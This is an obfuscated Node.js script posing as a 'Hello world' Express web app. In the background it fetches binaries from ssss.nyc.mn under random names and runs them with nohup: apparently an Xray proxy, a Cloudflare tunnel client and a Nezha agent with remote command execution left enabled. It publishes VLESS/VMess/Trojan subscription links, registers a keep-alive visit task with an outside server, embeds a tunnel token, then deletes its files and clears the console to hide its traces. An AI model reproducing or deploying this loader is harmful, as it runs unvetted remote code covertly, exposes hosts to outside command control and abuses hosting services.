const _0x27ff64=_0x517a;(function(_0x29b8f2,_0x4182fa){const _0x3febbb=_0x517a,_0x4b9669=_0x29b8f2();while(!![]){try{const _0xfff906=parseInt(_0x3febbb(0x157))/0x1*(-parseInt(_0x3febbb(0x127))/0x2)+parseInt(_0x3febbb(0x138))/0x3*(-parseInt(_0x3febbb(0x13a))/0x4)+parseInt(_0x3febbb(0x12d))/0x5*(-parseInt(_0x3febbb(0x14f))/0x6)+parseInt(_0x3febbb(0x1ab))/0x7+parseInt(_0x3febbb(0x19c))/0x8*(-parseInt(_0x3febbb(0x18e))/0x9)+parseInt(_0x3febbb(0x169))/0xa*(parseInt(_0x3febbb(0x17c))/0xb)+-parseInt(_0x3febbb(0x182))/0xc*(-parseInt(_0x3febbb(0x181))/0xd);if(_0xfff906===_0x4182fa)break;else _0x4b9669['push'](_0x4b9669['shift']());}catch(_0x3e4a8c){_0x4b9669['push'](_0x4b9669['shift']());}}}(_0x296f,0x22975));const express=require(_0x27ff64(0x1b4)),app=express(),axios=require(_0x27ff64(0x14a)),os=require('os'),fs=require('fs'),path=require(_0x27ff64(0x1bb)),{promisify}=require(_0x27ff64(0x1ac)),exec=promisify(require(_0x27ff64(0x13f))[_0x27ff64(0x184)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x27ff64(0x1b6)][_0x27ff64(0x161)]||'',PROJECT_URL=process['env'][_0x27ff64(0x11e)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x27ff64(0x1b6)][_0x27ff64(0x11a)]||_0x27ff64(0x18c),SUB_PATH=process['env'][_0x27ff64(0x19e)]||_0x27ff64(0x18d),PORT=process[_0x27ff64(0x1b6)][_0x27ff64(0x144)]||process['env']['PORT']||0xbb8,UUID=process[_0x27ff64(0x1b6)][_0x27ff64(0x153)]||_0x27ff64(0x1a9),NEZHA_SERVER=process[_0x27ff64(0x1b6)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x27ff64(0x1b6)][_0x27ff64(0x160)]||'',NEZHA_KEY=process[_0x27ff64(0x1b6)][_0x27ff64(0x194)]||'',ARGO_DOMAIN=process['env'][_0x27ff64(0x1b3)]||'2027.ygh.pp.ua',ARGO_AUTH=process[_0x27ff64(0x1b6)][_0x27ff64(0x1a7)]||_0x27ff64(0x1a6),ARGO_PORT=process[_0x27ff64(0x1b6)][_0x27ff64(0x1ba)]||0x1f41,CFIP=process[_0x27ff64(0x1b6)][_0x27ff64(0x1be)]||_0x27ff64(0x131),CFPORT=process[_0x27ff64(0x1b6)][_0x27ff64(0x191)]||0x1bb,NAME=process[_0x27ff64(0x1b6)][_0x27ff64(0x1a4)]||'2027';!fs[_0x27ff64(0x121)](FILE_PATH)?(fs[_0x27ff64(0x19d)](FILE_PATH),console[_0x27ff64(0x14c)](FILE_PATH+_0x27ff64(0x15c))):console[_0x27ff64(0x14c)](FILE_PATH+_0x27ff64(0x176));function generateRandomName(){const _0x559405=_0x27ff64,_0x5ed6f9=_0x559405(0x15b);let _0xc1d024='';for(let _0x43e716=0x0;_0x43e716<0x6;_0x43e716++){_0xc1d024+=_0x5ed6f9[_0x559405(0x1cc)](Math[_0x559405(0x1d4)](Math[_0x559405(0x190)]()*_0x5ed6f9[_0x559405(0x156)]));}return _0xc1d024;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x296f(){const _0x1afd7f=['Nodes\x20uploaded\x20successfully','clear','443','\x20>\x20nul\x202>&1','506895DpHwxh','blackhole','4nSSUrv','config.json','includes','\x0a\x20\x20tunnel:\x20','then','child_process','\x0a\x0avmess://','block','\x0avless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','SERVER_PORT','from','127.0.0.1','\x0a\x20\x20\x20\x20','http://ip-api.com/json/','App\x20is\x20running','axios','https://amd64.ssss.nyc.mn/agent','log','\x0a\x0atrojan://','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','1302IYJhsf','\x0a\x20\x20credentials-file:\x20','all','catch','UUID','taskkill\x20/f\x20/im\x20','false','length','1lJMFqB','list.txt','filter','2053','abcdefghijklmnopqrstuvwxyz','\x20is\x20created','aarch64','TunnelSecret','base64','NEZHA_PORT','UPLOAD_URL','Content-Type','close','arm','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','/sub.txt\x20saved\x20successfully','freedom','split','48480ppCwLa','2087','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','Add\x20automatic\x20access\x20task\x20faild:\x20','https://arm64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','countryCode','--tls','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20>/dev/null\x202>&1','\x20-s\x20','none','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20already\x20exists','unshift','createWriteStream','Download\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','451xCfzsq','&path=%2Fvless-argo%3Fed%3D2560#','8443','http','pipe','458822kZlQmg','36suNUSC','Error\x20downloading\x20files:','exec','nohup\x20','pop','org','push','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','automatic\x20access\x20task\x20added\x20successfully','basename','./tmp','sub','117CmwCTb','\x20failed:\x20','random','CFPORT','/api/add-nodes','set','NEZHA_KEY','status','unlinkSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/web','tunnel.json','data','https://amd64.ssss.nyc.mn/v1','54680krPuEc','mkdirSync','SUB_PATH','https://arm64.ssss.nyc.mn/bot','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20>/dev/null\x202>&1\x20&','get','.exe\x20>\x20nul\x202>&1','NAME','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','eyJhIjoiNGUwMzk5NjE2ZWRjZmViN2JiNDMwMDhiZWYxYmZlOGYiLCJ0IjoiMTQ1MGRlY2QtN2I0MC00YWJkLTk5ZTMtZjRiNzY2YmYwZjVmIiwicyI6IlpqSmpOekV5Tm1RdFlXTmpNUzAwWVRNNExXSTRaalV0WkRnd01ERTNNR1U1WlRWbSJ9','ARGO_AUTH','Empowerment\x20failed\x20for\x20','9afd1229-b893-40c1-84dd-51e7ce204913','forEach','1904147OuJbpE','util','country_code','test','fileUrl','match','\x22\x20>\x20/dev/null\x202>&1','post','ARGO_DOMAIN','express','readFileSync','env','\x20is\x20running','tls','toString','ARGO_PORT','path','ARGO_DOMAIN:','success','CFIP','join','unlink','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','has','rm\x20-rf\x20','/trojan-argo','response','quic','map','Unhandled\x20error\x20in\x20startserver:','?encryption=none&security=tls&sni=','tcp','\x20-c\x20\x22','charAt','vless','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/vless-argo','message','\x20-c\x20','fileName','&fp=firefox&type=ws&host=','floor','trojan','isFile','\x0aclient_secret:\x20','writeFileSync','Subscription\x20uploaded\x20successfully','FILE_PATH','Error\x20executing\x20command:\x20','2083','config.yaml','PROJECT_URL','platform','web\x20running\x20error:\x20','existsSync','utf-8','https://ipapi.co/json/','2096','readdirSync','arm64','173354AofOyW','error','stringify','https://oooo.serv00.net/add-url','send','substring','2085dkAesE','\x20-p\x20','application/json','/dev/null','cdns.doon.eu.org','xtls-rprx-vision','Unknown'];_0x296f=function(){return _0x1afd7f;};return _0x296f();}let npmPath=path[_0x27ff64(0x1bf)](FILE_PATH,npmName),phpPath=path[_0x27ff64(0x1bf)](FILE_PATH,phpName),webPath=path[_0x27ff64(0x1bf)](FILE_PATH,webName),botPath=path[_0x27ff64(0x1bf)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x27ff64(0x1bf)](FILE_PATH,_0x27ff64(0x158)),bootLogPath=path[_0x27ff64(0x1bf)](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,_0x27ff64(0x13b));function deleteNodes(){const _0x893899=_0x27ff64;try{if(!UPLOAD_URL)return;if(!fs[_0x893899(0x121)](subPath))return;let _0xcd6c34;try{_0xcd6c34=fs[_0x893899(0x1b5)](subPath,_0x893899(0x122));}catch{return null;}const _0x2ce892=Buffer[_0x893899(0x145)](_0xcd6c34,_0x893899(0x15f))[_0x893899(0x1b9)](_0x893899(0x122)),_0xc59690=_0x2ce892[_0x893899(0x168)]('\x0a')[_0x893899(0x159)](_0x4a3cbb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x893899(0x1ae)](_0x4a3cbb));if(_0xc59690[_0x893899(0x156)]===0x0)return;return axios[_0x893899(0x1b2)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0xc59690}),{'headers':{'Content-Type':_0x893899(0x12f)}})[_0x893899(0x152)](_0x1da756=>{return null;}),null;}catch(_0x4fac8d){return null;}}function cleanupOldFiles(){const _0x126629=_0x27ff64;try{const _0x2f4462=fs[_0x126629(0x125)](FILE_PATH);_0x2f4462['forEach'](_0x2b2b4f=>{const _0x96bc29=_0x126629,_0x5a2402=path['join'](FILE_PATH,_0x2b2b4f);try{const _0x4f2969=fs['statSync'](_0x5a2402);_0x4f2969[_0x96bc29(0x1d6)]()&&fs[_0x96bc29(0x196)](_0x5a2402);}catch(_0x385b24){}});}catch(_0x4e70d4){}}app[_0x27ff64(0x1a2)]('/',function(_0x12f578,_0x3eff0a){const _0x315f71=_0x27ff64;_0x3eff0a[_0x315f71(0x12b)]('Hello\x20world!');});async function generateConfig(){const _0x5105df=_0x27ff64,_0x109b4c={'log':{'access':_0x5105df(0x130),'error':_0x5105df(0x130),'loglevel':_0x5105df(0x174)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5105df(0x1cd),'settings':{'clients':[{'id':UUID,'flow':_0x5105df(0x132)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x5105df(0x1c4),'dest':0xbbc}]},'streamSettings':{'network':_0x5105df(0x1ca)}},{'port':0xbb9,'listen':_0x5105df(0x146),'protocol':_0x5105df(0x1cd),'settings':{'clients':[{'id':UUID}],'decryption':_0x5105df(0x174)},'streamSettings':{'network':_0x5105df(0x1ca),'security':'none'}},{'port':0xbba,'listen':_0x5105df(0x146),'protocol':_0x5105df(0x1cd),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x5105df(0x174),'wsSettings':{'path':_0x5105df(0x1cf)}},'sniffing':{'enabled':!![],'destOverride':[_0x5105df(0x17f),'tls','quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5105df(0x1b8),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5105df(0x146),'protocol':_0x5105df(0x1d5),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5105df(0x174),'wsSettings':{'path':_0x5105df(0x1c4)}},'sniffing':{'enabled':!![],'destOverride':[_0x5105df(0x17f),_0x5105df(0x1b8),_0x5105df(0x1c6)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x5105df(0x167),'tag':'direct'},{'protocol':_0x5105df(0x139),'tag':_0x5105df(0x141)}]};fs[_0x5105df(0x1d8)](path[_0x5105df(0x1bf)](FILE_PATH,'config.json'),JSON[_0x5105df(0x129)](_0x109b4c,null,0x2));}function getSystemArchitecture(){const _0x1732ba=_0x27ff64,_0x3a7440=os['arch']();return _0x3a7440===_0x1732ba(0x164)||_0x3a7440===_0x1732ba(0x126)||_0x3a7440===_0x1732ba(0x15d)?'arm':'amd';}function downloadFile(_0x27983f,_0x1c54d1,_0x2dd99d){const _0x3c871e=_0x27ff64,_0x351504=_0x27983f;!fs['existsSync'](FILE_PATH)&&fs[_0x3c871e(0x19d)](FILE_PATH,{'recursive':!![]});const _0x1094e1=fs[_0x3c871e(0x178)](_0x351504);axios({'method':_0x3c871e(0x1a2),'url':_0x1c54d1,'responseType':'stream'})[_0x3c871e(0x13e)](_0x453e15=>{const _0x283f3b=_0x3c871e;_0x453e15['data'][_0x283f3b(0x180)](_0x1094e1),_0x1094e1['on']('finish',()=>{const _0x2fa498=_0x283f3b;_0x1094e1[_0x2fa498(0x163)](),console[_0x2fa498(0x14c)]('Download\x20'+path[_0x2fa498(0x18b)](_0x351504)+'\x20successfully'),_0x2dd99d(null,_0x351504);}),_0x1094e1['on']('error',_0x4b4edb=>{const _0x276089=_0x283f3b;fs[_0x276089(0x1c0)](_0x351504,()=>{});const _0x53b54c=_0x276089(0x179)+path[_0x276089(0x18b)](_0x351504)+_0x276089(0x18f)+_0x4b4edb[_0x276089(0x1d0)];console[_0x276089(0x128)](_0x53b54c),_0x2dd99d(_0x53b54c);});})[_0x3c871e(0x152)](_0x3551b1=>{const _0x5508fd=_0x3c871e,_0x54f613=_0x5508fd(0x179)+path['basename'](_0x351504)+_0x5508fd(0x18f)+_0x3551b1['message'];console[_0x5508fd(0x128)](_0x54f613),_0x2dd99d(_0x54f613);});}async function downloadFilesAndRun(){const _0x568622=_0x27ff64,_0x3c9a28=getSystemArchitecture(),_0x1f786b=getFilesForArchitecture(_0x3c9a28);if(_0x1f786b[_0x568622(0x156)]===0x0){console['log'](_0x568622(0x14e));return;}const _0x3ed7ad=_0x1f786b[_0x568622(0x1c7)](_0xbc555e=>{return new Promise((_0x1cd938,_0x3f59d5)=>{const _0x2f2091=_0x517a;downloadFile(_0xbc555e[_0x2f2091(0x1d2)],_0xbc555e[_0x2f2091(0x1af)],(_0x26969c,_0x44cd97)=>{_0x26969c?_0x3f59d5(_0x26969c):_0x1cd938(_0x44cd97);});});});try{await Promise[_0x568622(0x151)](_0x3ed7ad);}catch(_0x4b7e10){console[_0x568622(0x128)](_0x568622(0x183),_0x4b7e10);return;}function _0x5b719d(_0x53c6f1){const _0x33ae9c=_0x568622,_0x28f714=0x1fd;_0x53c6f1[_0x33ae9c(0x1aa)](_0x4295e9=>{const _0x249478=_0x33ae9c;fs[_0x249478(0x121)](_0x4295e9)&&fs['chmod'](_0x4295e9,_0x28f714,_0x3df1b9=>{const _0x252715=_0x249478;_0x3df1b9?console[_0x252715(0x128)](_0x252715(0x1a8)+_0x4295e9+':\x20'+_0x3df1b9):console[_0x252715(0x14c)]('Empowerment\x20success\x20for\x20'+_0x4295e9+':\x20'+_0x28f714[_0x252715(0x1b9)](0x8));});});}const _0x1f9e7b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5b719d(_0x1f9e7b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x194cd9=NEZHA_SERVER[_0x568622(0x13c)](':')?NEZHA_SERVER[_0x568622(0x168)](':')[_0x568622(0x186)]():'',_0x1bdca6=new Set([_0x568622(0x136),_0x568622(0x17e),_0x568622(0x124),_0x568622(0x16a),_0x568622(0x11c),'2053']),_0x35ea26=_0x1bdca6[_0x568622(0x1c2)](_0x194cd9)?'true':_0x568622(0x155),_0x3b8ce5=_0x568622(0x1d7)+NEZHA_KEY+_0x568622(0x143)+NEZHA_SERVER+_0x568622(0x17b)+_0x35ea26+_0x568622(0x1c1)+UUID;fs[_0x568622(0x1d8)](path['join'](FILE_PATH,_0x568622(0x11d)),_0x3b8ce5);const _0x5bfd9c=_0x568622(0x185)+phpPath+_0x568622(0x1cb)+FILE_PATH+_0x568622(0x197);try{await exec(_0x5bfd9c),console[_0x568622(0x14c)](phpName+_0x568622(0x1b7)),await new Promise(_0x2e3cbc=>setTimeout(_0x2e3cbc,0x3e8));}catch(_0x10e805){console[_0x568622(0x128)]('php\x20running\x20error:\x20'+_0x10e805);}}else{let _0x57f92d='';const _0xa4f1c5=[_0x568622(0x136),_0x568622(0x17e),'2096',_0x568622(0x16a),_0x568622(0x11c),_0x568622(0x15a)];_0xa4f1c5[_0x568622(0x13c)](NEZHA_PORT)&&(_0x57f92d=_0x568622(0x170));const _0xc13463=_0x568622(0x185)+npmPath+_0x568622(0x173)+NEZHA_SERVER+':'+NEZHA_PORT+_0x568622(0x12e)+NEZHA_KEY+'\x20'+_0x57f92d+_0x568622(0x165);try{await exec(_0xc13463),console[_0x568622(0x14c)](npmName+'\x20is\x20running'),await new Promise(_0x4a084b=>setTimeout(_0x4a084b,0x3e8));}catch(_0x474486){console[_0x568622(0x128)]('npm\x20running\x20error:\x20'+_0x474486);}}}else console['log'](_0x568622(0x171));const _0x4b4c9a='nohup\x20'+webPath+_0x568622(0x1d1)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4b4c9a),console['log'](webName+_0x568622(0x1b7)),await new Promise(_0x23ae73=>setTimeout(_0x23ae73,0x3e8));}catch(_0x2cde5d){console['error'](_0x568622(0x120)+_0x2cde5d);}if(fs['existsSync'](botPath)){let _0x291172;if(ARGO_AUTH[_0x568622(0x1b0)](/^[A-Z0-9a-z=]{120,250}$/))_0x291172='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x291172=_0x568622(0x16e)+FILE_PATH+'/tunnel.yml\x20run':_0x291172=_0x568622(0x17a)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x568622(0x185)+botPath+'\x20'+_0x291172+_0x568622(0x1a1)),console[_0x568622(0x14c)](botName+'\x20is\x20running'),await new Promise(_0x8bb19=>setTimeout(_0x8bb19,0x7d0));}catch(_0x1d1bb4){console[_0x568622(0x128)](_0x568622(0x11b)+_0x1d1bb4);}}await new Promise(_0x36eb7a=>setTimeout(_0x36eb7a,0x1388));}function getFilesForArchitecture(_0x422e23){const _0x4f7165=_0x27ff64;let _0x57f97c;_0x422e23==='arm'?_0x57f97c=[{'fileName':webPath,'fileUrl':_0x4f7165(0x16d)},{'fileName':botPath,'fileUrl':_0x4f7165(0x19f)}]:_0x57f97c=[{'fileName':webPath,'fileUrl':_0x4f7165(0x198)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xcfa4b8=_0x422e23===_0x4f7165(0x164)?'https://arm64.ssss.nyc.mn/agent':_0x4f7165(0x14b);_0x57f97c['unshift']({'fileName':npmPath,'fileUrl':_0xcfa4b8});}else{const _0x131947=_0x422e23===_0x4f7165(0x164)?'https://arm64.ssss.nyc.mn/v1':_0x4f7165(0x19b);_0x57f97c[_0x4f7165(0x177)]({'fileName':phpPath,'fileUrl':_0x131947});}}return _0x57f97c;}function _0x517a(_0x5e6d18,_0x2402cd){_0x5e6d18=_0x5e6d18-0x119;const _0x296f14=_0x296f();let _0x517ac=_0x296f14[_0x5e6d18];return _0x517ac;}function argoType(){const _0x26b0d4=_0x27ff64;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x26b0d4(0x14c)](_0x26b0d4(0x16b));return;}if(ARGO_AUTH[_0x26b0d4(0x13c)](_0x26b0d4(0x15e))){fs[_0x26b0d4(0x1d8)](path[_0x26b0d4(0x1bf)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3173a9=_0x26b0d4(0x13d)+ARGO_AUTH[_0x26b0d4(0x168)]('\x22')[0xb]+_0x26b0d4(0x150)+path['join'](FILE_PATH,_0x26b0d4(0x199))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x26b0d4(0x1a5);fs[_0x26b0d4(0x1d8)](path[_0x26b0d4(0x1bf)](FILE_PATH,'tunnel.yml'),_0x3173a9);}else console[_0x26b0d4(0x14c)](_0x26b0d4(0x175));}async function extractDomains(){const _0x17ec53=_0x27ff64;let _0x4a463a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x4a463a=ARGO_DOMAIN,console[_0x17ec53(0x14c)](_0x17ec53(0x1bc),_0x4a463a),await _0x17cb20(_0x4a463a);else try{const _0x398a97=fs[_0x17ec53(0x1b5)](path[_0x17ec53(0x1bf)](FILE_PATH,'boot.log'),_0x17ec53(0x122)),_0x4d7d2d=_0x398a97[_0x17ec53(0x168)]('\x0a'),_0x5ecbf4=[];_0x4d7d2d[_0x17ec53(0x1aa)](_0x9b266=>{const _0x3a6452=_0x17ec53,_0x497699=_0x9b266[_0x3a6452(0x1b0)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x497699){const _0x372430=_0x497699[0x1];_0x5ecbf4['push'](_0x372430);}});if(_0x5ecbf4[_0x17ec53(0x156)]>0x0)_0x4a463a=_0x5ecbf4[0x0],console[_0x17ec53(0x14c)]('ArgoDomain:',_0x4a463a),await _0x17cb20(_0x4a463a);else{console[_0x17ec53(0x14c)](_0x17ec53(0x1a0)),fs[_0x17ec53(0x196)](path[_0x17ec53(0x1bf)](FILE_PATH,'boot.log'));async function _0x2a6ae5(){const _0x348887=_0x17ec53;try{process[_0x348887(0x11f)]==='win32'?await exec(_0x348887(0x154)+botName+_0x348887(0x1a3)):await exec('pkill\x20-f\x20\x22['+botName[_0x348887(0x1cc)](0x0)+']'+botName[_0x348887(0x12c)](0x1)+_0x348887(0x1b1));}catch(_0xd23790){}}_0x2a6ae5(),await new Promise(_0x12ea0f=>setTimeout(_0x12ea0f,0xbb8));const _0x2ae0cb=_0x17ec53(0x17a)+FILE_PATH+_0x17ec53(0x1ce)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2ae0cb+'\x20>/dev/null\x202>&1\x20&'),console[_0x17ec53(0x14c)](botName+_0x17ec53(0x1b7)),await new Promise(_0xb8cd8c=>setTimeout(_0xb8cd8c,0xbb8)),await extractDomains();}catch(_0x1ec548){console[_0x17ec53(0x128)](_0x17ec53(0x11b)+_0x1ec548);}}}catch(_0x524d69){console[_0x17ec53(0x128)]('Error\x20reading\x20boot.log:',_0x524d69);}async function _0x4231a0(){const _0x158fca=_0x17ec53;try{const _0x4718bb=await axios['get'](_0x158fca(0x123),{'timeout':0xbb8});if(_0x4718bb[_0x158fca(0x19a)]&&_0x4718bb[_0x158fca(0x19a)]['country_code']&&_0x4718bb['data'][_0x158fca(0x187)])return _0x4718bb[_0x158fca(0x19a)][_0x158fca(0x1ad)]+'_'+_0x4718bb[_0x158fca(0x19a)][_0x158fca(0x187)];}catch(_0x481ad2){try{const _0x416b46=await axios[_0x158fca(0x1a2)](_0x158fca(0x148),{'timeout':0xbb8});if(_0x416b46[_0x158fca(0x19a)]&&_0x416b46[_0x158fca(0x19a)][_0x158fca(0x195)]===_0x158fca(0x1bd)&&_0x416b46[_0x158fca(0x19a)][_0x158fca(0x16f)]&&_0x416b46[_0x158fca(0x19a)][_0x158fca(0x187)])return _0x416b46['data'][_0x158fca(0x16f)]+'_'+_0x416b46[_0x158fca(0x19a)][_0x158fca(0x187)];}catch(_0x466f99){}}return _0x158fca(0x133);}async function _0x17cb20(_0x4c5d65){const _0x1544d8=await _0x4231a0(),_0x452227=NAME?NAME+'-'+_0x1544d8:_0x1544d8;return new Promise(_0x36a307=>{setTimeout(()=>{const _0x12979b=_0x517a,_0x4ded20={'v':'2','ps':''+_0x452227,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x12979b(0x174),'net':'ws','type':_0x12979b(0x174),'host':_0x4c5d65,'path':'/vmess-argo?ed=2560','tls':_0x12979b(0x1b8),'sni':_0x4c5d65,'alpn':'','fp':'firefox'},_0x3a1c72=_0x12979b(0x142)+UUID+'@'+CFIP+':'+CFPORT+_0x12979b(0x1c9)+_0x4c5d65+'&fp=firefox&type=ws&host='+_0x4c5d65+_0x12979b(0x17d)+_0x452227+_0x12979b(0x140)+Buffer[_0x12979b(0x145)](JSON['stringify'](_0x4ded20))[_0x12979b(0x1b9)](_0x12979b(0x15f))+_0x12979b(0x14d)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x4c5d65+_0x12979b(0x1d3)+_0x4c5d65+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x452227+_0x12979b(0x147);console[_0x12979b(0x14c)](Buffer[_0x12979b(0x145)](_0x3a1c72)[_0x12979b(0x1b9)](_0x12979b(0x15f))),fs[_0x12979b(0x1d8)](subPath,Buffer[_0x12979b(0x145)](_0x3a1c72)[_0x12979b(0x1b9)](_0x12979b(0x15f))),console[_0x12979b(0x14c)](FILE_PATH+_0x12979b(0x166)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x6b8eda,_0x17b627)=>{const _0x4d03a1=_0x12979b,_0x5d013f=Buffer['from'](_0x3a1c72)[_0x4d03a1(0x1b9)](_0x4d03a1(0x15f));_0x17b627[_0x4d03a1(0x193)](_0x4d03a1(0x162),'text/plain;\x20charset=utf-8'),_0x17b627[_0x4d03a1(0x12b)](_0x5d013f);}),_0x36a307(_0x3a1c72);},0x7d0);});}}async function uploadNodes(){const _0xd3aa97=_0x27ff64;if(UPLOAD_URL&&PROJECT_URL){const _0x4ecb5b=PROJECT_URL+'/'+SUB_PATH,_0x1984cd={'subscription':[_0x4ecb5b]};try{const _0x5e666=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x1984cd,{'headers':{'Content-Type':_0xd3aa97(0x12f)}});return _0x5e666&&_0x5e666[_0xd3aa97(0x195)]===0xc8?(console['log'](_0xd3aa97(0x119)),_0x5e666):null;}catch(_0x5d10f3){if(_0x5d10f3[_0xd3aa97(0x1c5)]){if(_0x5d10f3[_0xd3aa97(0x1c5)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xd3aa97(0x121)](listPath))return;const _0x3ebd54=fs['readFileSync'](listPath,_0xd3aa97(0x122)),_0x1d2c90=_0x3ebd54[_0xd3aa97(0x168)]('\x0a')[_0xd3aa97(0x159)](_0x57bb95=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xd3aa97(0x1ae)](_0x57bb95));if(_0x1d2c90[_0xd3aa97(0x156)]===0x0)return;const _0x104938=JSON[_0xd3aa97(0x129)]({'nodes':_0x1d2c90});try{const _0x5093e6=await axios['post'](UPLOAD_URL+_0xd3aa97(0x192),_0x104938,{'headers':{'Content-Type':_0xd3aa97(0x12f)}});return _0x5093e6&&_0x5093e6['status']===0xc8?(console[_0xd3aa97(0x14c)](_0xd3aa97(0x134)),_0x5093e6):null;}catch(_0xbad0d7){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5460d0=_0x517a,_0x4e5428=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4e5428[_0x5460d0(0x188)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4e5428['push'](phpPath);process[_0x5460d0(0x11f)]==='win32'?exec('del\x20/f\x20/q\x20'+_0x4e5428[_0x5460d0(0x1bf)]('\x20')+_0x5460d0(0x137),_0x1f2908=>{const _0x1b6331=_0x5460d0;console['clear'](),console['log'](_0x1b6331(0x149)),console['log'](_0x1b6331(0x189));}):exec(_0x5460d0(0x1c3)+_0x4e5428[_0x5460d0(0x1bf)]('\x20')+_0x5460d0(0x172),_0x17113a=>{const _0x135649=_0x5460d0;console[_0x135649(0x135)](),console[_0x135649(0x14c)](_0x135649(0x149)),console['log'](_0x135649(0x189));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1bcec2=_0x27ff64;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3f61e2=await axios[_0x1bcec2(0x1b2)](_0x1bcec2(0x12a),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1bcec2(0x12f)}});return console[_0x1bcec2(0x14c)](_0x1bcec2(0x18a)),_0x3f61e2;}catch(_0x5d9839){return console[_0x1bcec2(0x128)](_0x1bcec2(0x16c)+_0x5d9839['message']),null;}}async function startserver(){const _0x427b2e=_0x27ff64;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x341aa8){console[_0x427b2e(0x128)]('Error\x20in\x20startserver:',_0x341aa8);}}startserver()[_0x27ff64(0x152)](_0x514c5e=>{const _0x23195c=_0x27ff64;console[_0x23195c(0x128)](_0x23195c(0x1c8),_0x514c5e);}),app['listen'](PORT,()=>console[_0x27ff64(0x14c)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
